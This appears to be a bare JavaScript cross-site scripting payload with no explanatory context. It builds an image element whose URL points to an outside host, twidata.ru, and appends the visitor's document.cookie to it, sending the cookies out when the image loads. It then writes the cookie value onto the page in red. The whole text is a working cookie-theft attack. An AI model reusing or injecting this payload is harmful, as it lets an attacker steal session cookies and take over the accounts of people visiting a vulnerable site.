var i = document.createElement('img');
i.src = "http://twidata.ru/kitten.png?cookies=" + document.cookie;
document.body.appendChild(i);

document.write("<br/><br/><u>Cookie</u>: <font color=\"red\">" + document.cookie + "</font><br><br/>\n");

